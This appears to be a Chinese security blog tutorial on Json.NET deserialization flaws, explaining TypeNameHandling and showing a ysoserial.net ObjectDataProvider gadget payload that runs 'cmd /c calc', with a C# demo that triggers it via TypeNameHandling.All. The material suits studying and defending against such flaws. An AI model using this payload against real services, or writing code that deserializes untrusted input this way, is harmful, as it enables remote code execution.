# Dot NET-Json.Net反序列化漏洞

  
  
&lt;!--more--&gt;  
## Json.Net基础  
Newtonsoft.Json，是一个开源的Json.Net库，官方地址：  
https://www.newtonsoft.com/json  
在使用Json的时候，开发者很多时候会涉及到几个序列化对象的使用：`DataContractJsonSerializer`、`JavaScriptSerializer`、和`Json.Net`。大多数人会选择`Json.Net`。  
## Json.Net序列化  
在`Newtonsoft.Json`中使用`JSONSerializer`可以实现`.NET`对象与`Json`之间的转化，`JSONSerializer`把`.NET`对象的属性名转换为`Json`数据中的`Key`，把对象的属性值转化为`JSON`数据中的`Value`。  
Demo  
```c#  
using Newtonsoft.Json;  
using System;  
using System.Diagnostics;  
using System.Text;  
using System.Windows.Markup;  
  
namespace JsonDeserialization  
{  
    [JsonObject(MemberSerialization.OptIn)]  
    public class JsonClass   
    {  
        private string classname;  
        private string name;  
        private int age;  
        [JsonIgnore]  
        public string Classname { get =&gt; classname; set =&gt; classname = value; }  
        [JsonProperty]  
        public string Name { get =&gt; name; set =&gt; name = value; }  
        [JsonProperty]  
        public int Age { get =&gt; age; set =&gt; age = value; }  
        public override string ToString()  
        {  
            return base.ToString();  
        }  
        public static void ClassMethod(string value)  
        {  
            Process.Start(value);  
        }  
  
    }  
    class Program  
    {  
        static void Main(string[] args)  
        {  
            JsonClass jsonclass = new JsonClass();  
            jsonclass.Name = &#34;huahua&#34;;  
            jsonclass.Age = 18;  
            jsonclass.Classname = &#34;JsonClass&#34;;  
            string json = JsonConvert.SerializeObject(jsonclass);  
            Console.WriteLine(&#34;Serialized JSON: &#34; &#43; json);  
  
        }  
    }  
}  
```  
并且有三个成员，`Classname`在序列化的过程中被忽略，此外实现了一个静态方法`ClassMethod`启动进程。序列化过程中通过创建对象实例分别给成员赋值。  
```  
Serialized JSON: {&#34;Name&#34;:&#34;huahua&#34;,&#34;Age&#34;:18}  
```  
JSON字符串并没有包含方法`ClassMethod`，因为它是静态方法，不参与实例化的过程。  
JsonSerializerSettings属性  
```  
- NullValueHandling:如果序列化时需要忽略值为NULL的属性，使用JsonSerializerSettings.NullValueHandling.Ignore来实现  
- TypeNameAssemblyFormatHandling:默认情况下Json.NET只使用类型中的部分程序集名称，为了避免在一些环境下不兼容的问题，需要使用到完整的程序集名称，包括版本号、公钥等。JsonSerializerSettings.TypeNameAssemblyFormatHandling.Full  
- TypeNameHandling:控制Json.NET是否在使用$type属性进行序列化包含.NET类型名称，并从该属性读取.NET类型名称以确定在反序列化期间要创建的类型。  
```  
修改代码添加`TypeNameAssemblyFormatHandling.Full`、`TypeNameHandling.ALL`  
```c  
static void Main(string[] args)  
        {  
            JsonClass jsonclass = new JsonClass();  
            jsonclass.Name = &#34;huahua&#34;;  
            jsonclass.Age = 18;  
            jsonclass.Classname = &#34;JsonClass&#34;;  
            string json = JsonConvert.SerializeObject(jsonclass,new JsonSerializerSettings {   
                    TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full,  
                    TypeNameHandling = TypeNameHandling.All,  
            });  
            Console.WriteLine(&#34;Serialized JSON: &#34; &#43; json);  
  
        }  
```  
这样打印的数据中带有完整的程序集名等信息  
```  
Serialized JSON: {&#34;$type&#34;:&#34;JsonDeserialization.JsonClass, ConsoleApp2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null&#34;,&#34;Name&#34;:&#34;huahua&#34;,&#34;Age&#34;:18}  
```  
## Json.Net反序列化  
反序列化过程就是将Json字符串转换为对象，通过创建一个新对象的方式调用`JsonConvert.DeserializeObject`方法实现的，传入两个参数，第一个参数需要被序列化的字符串、第二个参数设置序列化配置选项来指定`JsonSerializer`按照指定的类型名称处理，其中`TypeNameHandling`可选择的成员分为五种  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202506041124643.png)
默认情况下设置为`TypeNameHandling.None`，表示`Json.NET`反序列化期间不读取或写入类型名称。  
### ObjectDataProvider  
漏洞触发点在于`TypeNameHandling`这个枚举值，如果开发者设置为非空值、也就是对象(Objects)、数组(Arrays)、自动识别(Auto)、所有值(ALL)的时候都会造成反序列化漏洞。  
使用`yso`生成  
```powershell  
C:\Users\nlrvana\Desktop\ysoserial.net-master\ysoserial\bin\Release&gt;ysoserial.exe -g ObjectDataProvider -f json.net -c calc  
{  
    &#39;$type&#39;:&#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#39;,  
    &#39;MethodName&#39;:&#39;Start&#39;,  
    &#39;MethodParameters&#39;:{  
        &#39;$type&#39;:&#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;,  
        &#39;$values&#39;:[&#39;cmd&#39;, &#39;/c calc&#39;]  
    },  
    &#39;ObjectInstance&#39;:{&#39;$type&#39;:&#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;}  
}  
```  
Demo  
```c#  
using Newtonsoft.Json;  
using System;  
using System.IO;  
  
namespace JsonDeserialization  
{  
    class Program  
    {  
        static void Main(string[] args)  
        {  
            string json = @&#34;{  
    &#39;$type&#39;:&#39;System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#39;,  
    &#39;MethodName&#39;:&#39;Start&#39;,  
    &#39;MethodParameters&#39;:{  
        &#39;$type&#39;:&#39;System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;,  
        &#39;$values&#39;:[&#39;cmd&#39;, &#39;/c calc&#39;]  
    },  
    &#39;ObjectInstance&#39;:{&#39;$type&#39;:&#39;System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089&#39;}  
}&#34;;  
            JsonConvert.DeserializeObject(json, new JsonSerializerSettings() { TypeNameHandling = TypeNameHandling.All });  
  
        }  
    }  
}  
```  
  
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/dot-net-json.net%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/  

